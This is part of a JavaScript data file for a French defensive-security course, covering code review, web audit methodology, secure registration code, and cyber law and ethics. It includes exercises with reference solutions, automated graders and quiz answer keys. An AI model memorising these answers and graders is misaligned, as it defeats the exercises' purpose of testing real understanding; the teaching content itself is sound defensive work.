            tests: [sansErreur(), exprVerif('analyser(code)', 'Les cinq failles sont détectées aux bonnes lignes', v => v.length === 5 && v[0].ligne === 1 && v[0].message === 'injection SQL possible' && v[1].ligne === 2 && /innerHTML/.test(v[1].message) && v[2].ligne === 3 && v[2].message === 'secret en dur' && v[3].ligne === 4 && /TLS/.test(v[3].message) && v[4].ligne === 5 && v[4].message === 'exécution dynamique', 'Attendu 5 trouvailles triées par ligne : SQL (1), innerHTML (2), secret (3), TLS (4), eval (5).'), expr('analyser("const total = a + b;\\nconst nom = prenom + \\" \\" + nom;").length', 0, 'Une concaténation ordinaire (sans mot-clé SQL) ne doit pas être signalée.'), exprVerif('analyser(\'db.query("SELECT 1");\')', 'Une requête sans concaténation n\'est pas signalée', v => v.length === 0), exprVerif('analyser(\'const token = "abc123";\')', 'Détecte un secret en dur nommé token', v => v.length === 1 && v[0].message === 'secret en dur')]
          },
          quiz: [
            { q: 'Quelle est la méthode pour repérer une faille d\'injection dans du code ?', options: ['Chercher le mot "faille"', 'Suivre la donnée de l\'entrée utilisateur jusqu\'aux points de sortie dangereux', 'Lancer le programme'], bonne: 1, explication: 'La donnée non fiable qui atteint SQL, HTML, le shell ou un chemin sans traitement est la faille.' },
            { q: 'Que repère <code>npm audit</code> ou <code>pip-audit</code> ?', options: ['Les fautes de frappe', 'Les dépendances contenant des vulnérabilités connues', 'Les secrets en dur'], bonne: 1, explication: 'Les bibliothèques tierces vulnérables sont une porte d\'entrée fréquente.' },
            { q: 'Un outil d\'analyse statique remplace-t-il la revue humaine ?', options: ['Oui', 'Non : il attrape l\'évident à grande échelle, l\'humain comprend le contexte', 'Seulement pour le Python'], bonne: 1, explication: 'Les deux sont complémentaires ; le contexte métier échappe aux outils.' }
          ]
        },
        {
          titre: 'Audit d\'une application web, pas à pas',
          theorie: `<p>Comment évaluer la sécurité d'une application que tu as le droit de tester (la tienne, ou un périmètre autorisé par écrit) ? Une démarche structurée, inspirée du <strong>OWASP Testing Guide</strong> et du Top 10.</p>
<h2>1. Reconnaissance</h2>
<p>Cartographier avant d'attaquer : technologies (en-têtes, <code>robots.txt</code>, empreintes), points d'entrée (formulaires, API, paramètres d'URL, cookies, en-têtes), rôles (anonyme, utilisateur, admin). Outils passifs d'abord : navigateur, DevTools, proxy d'interception (Burp Suite, OWASP ZAP) qui enregistre toutes les requêtes.</p>
<h2>2. Configuration et transport</h2>
<ul><li>HTTPS forcé, HSTS, certificat valide, TLS 1.2+ seulement.</li><li>En-têtes de sécurité (CSP, X-Content-Type-Options, X-Frame-Options, Referrer-Policy).</li><li>Cookies <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>.</li><li>Pas de fuite de version, pas de pages de debug, pas de fichiers exposés (<code>.git</code>, <code>.env</code>, sauvegardes).</li></ul>
<h2>3. Authentification et sessions</h2>
<p>Politique de mot de passe, limitation des tentatives, MFA, messages d'erreur non révélateurs (« identifiants invalides », pas « ce compte n'existe pas »), régénération de session à la connexion, expiration, robustesse du « mot de passe oublié », sécurité des jetons.</p>
<h2>4. Autorisation</h2>
<p>Le test le plus rentable : se connecter comme utilisateur A, intercepter une requête (ex. <code>GET /api/factures/1042</code>), remplacer l'identifiant par celui d'une ressource de B, et vérifier le refus (403). Tester aussi l'accès aux routes admin en tant qu'utilisateur simple, et la manipulation de champs (<code>role</code>, <code>prix</code>). C'est là que se trouvent la majorité des failles réelles.</p>
<h2>5. Validation des entrées</h2>
<p>Sur chaque point d'entrée, essayer les charges classiques (sur ton périmètre autorisé) : caractères spéciaux SQL, balises HTML, chemins <code>../</code>, valeurs hors bornes, types inattendus, champs manquants ou en trop. Observer les réponses et les messages d'erreur.</p>
<h2>6. Logique métier</h2>
<p>Les failles que les outils ne voient pas : enchaîner les étapes d'un paiement dans le désordre, appliquer un code promo deux fois, commander une quantité négative, contourner une limite. Elles demandent de comprendre le métier.</p>
<h2>7. Dépendances et secrets</h2>
<p>Scanner les bibliothèques (<code>npm audit</code>, Trivy sur l'image Docker), chercher des secrets dans le code et l'historique Git (<code>git-secrets</code>, trufflehog).</p>
<h2>Rapport</h2>
<p>Pour chaque constat : description, gravité (CVSS), preuve (reproductible), impact, recommandation concrète. Trier par risque. Un bon rapport est actionnable, pas une liste brute d'outils. Un retest valide les corrections.</p>
<div class="callout warn"><b>Rappel légal</b>Tester un système sans autorisation écrite est un délit. Un périmètre (scope) définit ce qui est autorisé : respecte-le à la lettre. En bug bounty, lis le programme avant toute action.</div>`,
          exercice: {
            type: 'qcm', titre: 'Prioriser les constats d\'audit',
            enonce: `<p>À l'issue d'un audit autorisé, tu as relevé ces constats. Lesquels sont de gravité <strong>haute ou critique</strong> (à corriger en priorité) ? (plusieurs réponses)</p>
<ol><li>N'importe quel utilisateur connecté peut lire les factures des autres en changeant l'identifiant dans l'URL.</li><li>L'en-tête <code>Server</code> révèle « nginx 1.24 ».</li><li>Le formulaire de connexion n'a pas de limitation de tentatives et accepte les mots de passe de 4 caractères.</li><li>Les mots de passe sont stockés en SHA-1 sans sel.</li><li>La page 404 n'a pas d'en-tête <code>X-Frame-Options</code>.</li><li>Un champ <code>role</code> envoyé dans la mise à jour de profil est accepté et permet de devenir admin.</li></ol>`,
            options: ['Constat 1 (accès aux factures d\'autrui)', 'Constat 2 (version de nginx)', 'Constat 3 (pas de limite + mots de passe faibles)', 'Constat 4 (SHA-1 sans sel)', 'Constat 5 (X-Frame-Options sur la 404)', 'Constat 6 (élévation via champ role)'],
            bonne: [0, 2, 3, 5], multiple: true,
            explication: 'Les constats 1 et 6 sont des failles de contrôle d\'accès critiques (données d\'autrui, élévation de privilège). Le 3 (force brute facilitée) et le 4 (hachage cassable) sont hauts. La version de nginx (2) et l\'absence de X-Frame-Options sur une 404 statique (5) sont de faible gravité.'
          },
          quiz: [
            { q: 'Quel test révèle le plus souvent des failles réelles ?', options: ['Le scan de ports', 'Le test de contrôle d\'accès (accéder aux ressources d\'un autre utilisateur)', 'La vérification des polices de caractères'], bonne: 1, explication: 'Le contrôle d\'accès défaillant est la faille n° 1 du Top 10 OWASP.' },
            { q: 'Que doit contenir un bon constat de rapport ?', options: ['Le nom de l\'outil utilisé', 'Description, gravité, preuve reproductible, impact et recommandation', 'Une capture d\'écran uniquement'], bonne: 1, explication: 'Le rapport doit être actionnable par les développeurs.' },
            { q: 'Avant de tester une application tierce, que faut-il ?', options: ['Une connexion rapide', 'Une autorisation écrite et un périmètre défini', 'Un VPN'], bonne: 1, explication: 'Sans autorisation, le test est illégal.' }
          ]
        },
        {
          titre: 'Développer de façon sécurisée',
          theorie: `<p>La sécurité coûte dix fois moins cher intégrée dès la conception qu'ajoutée après l'incident. Voici les pratiques qui, appliquées par défaut, éliminent la plupart des vulnérabilités, côté développeur.</p>
<h2>Les réflexes de code</h2>
<ul><li><strong>Requêtes paramétrées</strong> toujours, ORM ou pilote, jamais de concaténation SQL.</li><li><strong>Échappement à la sortie</strong> par le moteur de templates ; éviter <code>innerHTML</code> et ses équivalents.</li><li><strong>Valider les entrées</strong> par liste blanche et par type, avec un schéma (Pydantic, Zod, Joi) qui rejette les champs inattendus.</li><li><strong>Contrôle d'accès centralisé</strong>, refus par défaut, vérifié à chaque accès côté serveur.</li><li><strong>Secrets hors du code</strong> : variables d'environnement, coffre (Vault, secrets du cloud) ; <code>.env</code> dans <code>.gitignore</code>.</li><li><strong>Hachage de mots de passe</strong> avec Argon2/bcrypt ; jetons et identifiants via un générateur cryptographique.</li><li><strong>Dépendances</strong> à jour et scannées ; épingler les versions, vérifier les intégrités (lockfiles).</li><li><strong>Messages d'erreur génériques</strong> en production ; journalisation détaillée côté serveur.</li></ul>
<h2>Les en-têtes et la configuration</h2>
<p>HTTPS + HSTS, CSP, cookies sécurisés, CORS restrictif, rate limiting sur les points sensibles (connexion, API), taille et type des téléversements bornés. Un framework moderne (Django, Rails, Laravel, Spring, Express+helmet) fournit des défauts sûrs : ne pas les désactiver.</p>
<h2>Gestion des secrets et du CI/CD</h2>
<p>La chaîne de build est une cible (attaques de la <em>supply chain</em>) : dépendances vérifiées, build reproductible, droits minimaux des jetons de CI, pas de secret dans les logs de pipeline, signature des artefacts et des images. Scanner le code (SAST), les dépendances (SCA) et les images à chaque commit.</p>
<h2>Modélisation des menaces, tôt</h2>
<p>Avant de coder une fonctionnalité sensible, poser les quatre questions du modèle de menace (leçon 1.1). Un diagramme de flux de données et une liste de « comment on en abuse » suffisent à éviter les erreurs de conception, bien moins chères à corriger sur un schéma que dans le code en production.</p>
<h2>Culture et processus</h2>
<ul><li>Revue de code avec un œil sécurité ; tests de sécurité automatisés dans la CI.</li><li>Politique de divulgation (<code>security.txt</code>, contact) et, selon la taille, programme de bug bounty.</li><li>Mises à jour et correctifs rapides ; inventaire des actifs et des dépendances (SBOM).</li><li>Plan de réponse à incident écrit et répété ; sauvegardes testées.</li><li>Formation continue : les techniques évoluent, l'OWASP et l'ANSSI publient des guides à jour.</li></ul>
<div class="callout info"><b>Lab</b>Tu transformes une fonction d'inscription vulnérable en version sécurisée, en appliquant plusieurs réflexes à la fois.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Sécuriser une inscription',
            enonce: `<p>Implémente <code>inscrire(donnees, depot)</code> de façon sécurisée. <code>donnees</code> contient <code>{ email, motDePasse, role? }</code>. Règles : valider l'email (format simple, longueur ≤ 254), refuser un mot de passe de moins de 10 caractères, <strong>ignorer tout champ <code>role</code></strong> fourni par le client (le rôle est toujours <code>"membre"</code>), ne jamais stocker le mot de passe en clair (stocke <code>"hache:" + motDePasse.length</code> pour simuler un hachage — en vrai, Argon2), et renvoyer <code>{ ok: true, utilisateur }</code> (sans le mot de passe) ou <code>{ ok: false, erreur }</code>. <code>depot.existe(email)</code> dit si l'email est déjà pris (renvoyer l'erreur générique <code>"inscription impossible"</code> dans ce cas, pour ne pas révéler l'existence du compte). <code>depot.ajouter(u)</code> enregistre.</p>`,
            depart: `function inscrire(donnees, depot) {
  // ...
}

const stockage = [];
const depot = {
  existe: (e) => stockage.some(u => u.email === e),
  ajouter: (u) => stockage.push(u),
};
console.log(inscrire({ email: "ana@mail.fr", motDePasse: "motdepassefort", role: "admin" }, depot));
console.log(inscrire({ email: "x", motDePasse: "court" }, depot));
`,
            solution: `function inscrire(donnees, depot) {
  const email = String(donnees.email || "").trim().toLowerCase();
  const motDePasse = String(donnees.motDePasse || "");
  if (!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email) || email.length > 254) {
    return { ok: false, erreur: "email invalide" };
  }
  if (motDePasse.length < 10) {
    return { ok: false, erreur: "mot de passe trop court (10 caractères minimum)" };
  }
  if (depot.existe(email)) {
    return { ok: false, erreur: "inscription impossible" };   // générique : ne révèle pas l'existence
  }
  const utilisateur = {
    email,
    motDePasseHache: "hache:" + motDePasse.length,   // simulation ; en vrai : await argon2.hash(...)
    role: "membre",                                   // jamais depuis l'entrée client
  };
  depot.ajouter(utilisateur);
  const { motDePasseHache, ...publique } = utilisateur;
  return { ok: true, utilisateur: publique };
}

const stockage = [];
const depot = {
  existe: (e) => stockage.some(u => u.email === e),
  ajouter: (u) => stockage.push(u),
};
console.log(inscrire({ email: "ana@mail.fr", motDePasse: "motdepassefort", role: "admin" }, depot));
console.log(inscrire({ email: "x", motDePasse: "court" }, depot));`,
            tests: [sansErreur(), expr('(() => { const s = []; const d = { existe: e => s.some(u => u.email === e), ajouter: u => s.push(u) }; return inscrire({ email: "ana@mail.fr", motDePasse: "motdepassefort", role: "admin" }, d).utilisateur.role; })()', 'membre', 'Le rôle "admin" fourni par le client doit être ignoré : toujours "membre".'), exprVerif('(() => { const s = []; const d = { existe: e => s.some(u => u.email === e), ajouter: u => s.push(u) }; inscrire({ email: "a@b.fr", motDePasse: "motdepassefort" }, d); return s[0]; })()', 'Le mot de passe n\'est jamais stocké en clair', v => v && !('motDePasse' in v) && typeof v.motDePasseHache === 'string', 'Stocke un haché (motDePasseHache), pas le mot de passe en clair.'), exprVerif('(() => { const d = { existe: () => false, ajouter: () => {} }; return inscrire({ email: "a@b.fr", motDePasse: "motdepassefort" }, d).utilisateur; })()', 'La réponse ne contient pas le mot de passe', v => v && !('motDePasse' in v) && !('motDePasseHache' in v), 'L\'utilisateur renvoyé ne doit exposer ni le mot de passe ni son haché.'), expr('inscrire({ email: "x", motDePasse: "motdepassefort" }, { existe: () => false, ajouter: () => {} }).ok', false, 'Un email invalide est refusé.'), expr('inscrire({ email: "a@b.fr", motDePasse: "court" }, { existe: () => false, ajouter: () => {} }).ok', false, 'Un mot de passe de moins de 10 caractères est refusé.'), expr('inscrire({ email: "a@b.fr", motDePasse: "motdepassefort" }, { existe: () => true, ajouter: () => {} }).erreur', 'inscription impossible', 'Un email déjà pris renvoie un message générique, pas « compte existant ».')]
          },
          quiz: [
            { q: 'Pourquoi ignorer un champ <code>role</code> envoyé par le client à l\'inscription ?', options: ['Pour la performance', 'Pour éviter une élévation de privilège (mass assignment)', 'Parce que role n\'existe pas'], bonne: 1, explication: 'Le serveur fixe les attributs sensibles ; ne jamais faire confiance au client.' },
            { q: 'Pourquoi un message générique « inscription impossible » si l\'email existe ?', options: ['C\'est plus court', 'Pour ne pas révéler quels emails ont un compte (énumération)', 'Pour tromper l\'utilisateur'], bonne: 1, explication: 'Un message précis permet d\'énumérer les comptes existants.' },
            { q: 'Où stocker les secrets d\'une application ?', options: ['Dans le code source', 'Dans des variables d\'environnement ou un coffre, hors de Git', 'Dans la base en clair'], bonne: 1, explication: 'Un secret dans Git reste dans l\'historique même après suppression.' }
          ]
        },
        {
          titre: 'Éthique, droit et carrière en cybersécurité',
          theorie: `<p>La cybersécurité est un domaine où la même compétence peut protéger ou nuire. Le cadre éthique et légal n'est pas une contrainte annexe : c'est ce qui sépare le professionnel du délinquant.</p>
<h2>Le cadre légal en France</h2>
<ul><li>Accéder ou se maintenir dans un système sans autorisation : <strong>article 323-1</strong> du Code pénal (jusqu'à 3 ans et 100 000 €, davantage si données de l'État).</li><li>Entraver ou fausser le fonctionnement d'un système : <strong>323-2</strong>.</li><li>Modifier ou supprimer des données : <strong>323-3</strong>.</li><li>Détenir ou diffuser des outils conçus pour commettre ces infractions : <strong>323-3-1</strong> (d'où l'importance de la finalité et du cadre).</li><li>Données personnelles : <strong>RGPD</strong> et loi Informatique et Libertés ; notification des violations à la CNIL sous 72 h.</li></ul>
<p>« Je voulais juste tester » n'est pas une défense. L'autorisation doit être <strong>écrite, préalable et précise</strong> (périmètre, dates, limites).</p>
<h2>La divulgation responsable</h2>
<p>Tu découvres une faille sur un service que tu utilises. La voie légale et éthique : <em>divulgation coordonnée</em>. Contacter l'éditeur (fichier <code>security.txt</code>, adresse <code>security@</code>, programme de bug bounty), décrire la faille sans l'exploiter au-delà de la preuve minimale, laisser un délai raisonnable pour corriger (souvent 90 jours), puis publier éventuellement une fois corrigée. Ne jamais extraire de données réelles, ne jamais extorquer. En France, l'article L.2321-4 du Code de la défense protège le lanceur d'alerte de bonne foi qui signale une faille à l'ANSSI.</p>
<h2>S'entraîner légalement</h2>
<p>Plateformes conçues pour cela : <strong>Root-Me</strong>, <strong>TryHackMe</strong>, <strong>Hack The Box</strong>, <strong>PortSwigger Web Security Academy</strong> (gratuite, excellente), <strong>OWASP Juice Shop</strong> (application volontairement vulnérable à installer chez soi), les CTF (CTFtime liste les compétitions). Les programmes de <strong>bug bounty</strong> (YesWeHack, HackerOne, Bugcrowd) offrent un cadre légal et rémunéré, dans un périmètre défini.</p>
<h2>Les métiers</h2>
<table><tr><th>Métier</th><th>Rôle</th></tr>
<tr><td>Analyste SOC</td><td>surveille, détecte, répond aux incidents (blue team)</td></tr>
<tr><td>Pentester / Red team</td><td>teste la sécurité en simulant des attaques, sous contrat</td></tr>
<tr><td>Ingénieur sécurité / DevSecOps</td><td>intègre la sécurité dans le développement et l'infrastructure</td></tr>
<tr><td>Analyste forensic / réponse à incident</td><td>investigue après une attaque</td></tr>
<tr><td>GRC (gouvernance, risque, conformité)</td><td>politiques, audits, conformité (RGPD, ISO 27001, NIS2)</td></tr>
<tr><td>Chercheur en vulnérabilités</td><td>trouve des failles nouvelles, publie, contribue</td></tr></table>
<h2>Se former et progresser</h2>
<ul><li>Bases solides : réseau, systèmes (Linux), un langage (Python), le web.</li><li>Pratiquer : labs, CTF, home lab, contributions open source.</li><li>Certifications selon la voie : CompTIA Security+ (généraliste), OSCP (offensif pratique), des parcours défensifs (Blue Team), ISO 27001 lead (GRC).</li><li>Veille : avis du CERT-FR et de l'ANSSI, OWASP, podcasts et bulletins, comptes de chercheurs.</li><li>Communauté : associations, conférences (le FIC, les Nuit du Hack/LeHACK), échanges — dans le respect de la loi.</li></ul>
<h2>L'état d'esprit</h2>
<p>Curiosité, rigueur, humilité (on ne sait jamais tout, les attaquants innovent), et intégrité. La confiance est le capital d'un professionnel de la sécurité : une seule transgression la détruit. Protéger les gens, leurs données et leurs services : c'est le sens du métier.</p>
<div class="callout ok"><b>Parcours terminé</b>Tu as les fondamentaux défensifs : modèle de menace, sécurité web, cryptographie, réseau, détection, revue de code et cadre éthique. Prochaine étape : une plateforme d'entraînement légale, un CTF, ou OWASP Juice Shop installé chez toi. Reste du bon côté, et continue d'apprendre.</div>`,
          exercice: {
            type: 'texte', titre: 'Rédiger une divulgation responsable',
            enonce: `<p>Tu as découvert, en utilisant normalement un site, qu'en modifiant un identifiant dans l'URL tu accèdes aux commandes d'autres clients (IDOR). Rédige le message de divulgation responsable que tu enverrais à l'éditeur : identifie-toi, décris la faille et son impact sans détailler d'exploitation offensive, précise que tu n'as pas extrait de données, propose de l'aide et demande un délai de correction. Les critères ci-dessous se cochent automatiquement.</p>`,
            placeholder: 'Objet : Signalement de vulnérabilité\n\nBonjour, …',
            criteres: [
              { label: 'Décrit la faille (accès aux données d\'autres utilisateurs / IDOR)', re: /idor|autre[s]? (clients?|utilisateurs?)|donn[ée]es? d.autrui|r[ée]f[ée]rence directe|contr[ôo]le d.acc[èe]s/i },
              { label: 'Précise l\'impact (confidentialité des données clients)', re: /impact|confidentialit|donn[ée]es? (personnelles|clients?)|fuite/i },
              { label: 'Indique n\'avoir pas extrait ni exploité les données', re: /n.ai (pas|rien)|sans (extraire|exploiter|t[ée]l[ée]charger)|aucune donn[ée]e|pas (acc[ée]d[ée]|consult[ée])/i },
              { label: 'Propose un délai de correction ou une divulgation coordonnée', re: /d[ée]lai|90 jours|coordonn|avant (de|toute) publi|corriger/i },
              { label: 'Ton coopératif et professionnel (propose de l\'aide)', re: /[àa] disposition|aider|compl[ée]ment|pr[ée]cisions?|rester en contact|volontiers/i },
              { label: 'Au moins 70 mots', verif: t => t.trim().split(/\s+/).length >= 70 }
            ],
            solution: `<p>Objet : Signalement d'une vulnérabilité de contrôle d'accès</p><p>Bonjour,</p><p>En utilisant votre site comme client, j'ai constaté qu'en modifiant l'identifiant numérique dans l'URL de la page « mes commandes », il est possible d'afficher les commandes d'autres clients (vulnérabilité de type IDOR / référence directe non sécurisée). L'impact concerne la confidentialité des données personnelles de vos clients.</p><p>Je n'ai consulté qu'une seule page de test avec mon propre compte pour confirmer le problème, sans extraire, télécharger ni exploiter aucune donnée appartenant à autrui.</p><p>Je me tiens à votre disposition pour fournir des précisions ou aider à reproduire le problème. Je vous propose un délai de 90 jours avant toute publication éventuelle, dans le cadre d'une divulgation coordonnée. Pourriez-vous m'accuser réception et m'indiquer le correctif ?</p><p>Cordialement.</p>`
          },
          quiz: [
            { q: 'Que dit la loi française sur l\'accès non autorisé à un système ?', options: ['C\'est autorisé si on ne casse rien', 'C\'est un délit (article 323-1), même sans dégât', 'Ce n\'est illégal que pour les données bancaires'], bonne: 1, explication: 'L\'accès ou le maintien non autorisé suffit à constituer l\'infraction.' },
            { q: 'Qu\'est-ce que la divulgation responsable ?', options: ['Publier la faille immédiatement', 'Signaler à l\'éditeur, laisser un délai de correction, ne pas exploiter', 'Vendre la faille'], bonne: 1, explication: 'Coordination avec l\'éditeur, preuve minimale, pas d\'extraction de données.' },
            { q: 'Où s\'entraîner légalement à l\'attaque ?', options: ['Sur n\'importe quel site public', 'Sur des plateformes dédiées (Root-Me, TryHackMe, Juice Shop) et en bug bounty', 'Sur le site de son employeur sans prévenir'], bonne: 1, explication: 'Ces environnements sont conçus et autorisés pour la pratique.' }
          ]
        }
      ]
    }
  ]
};
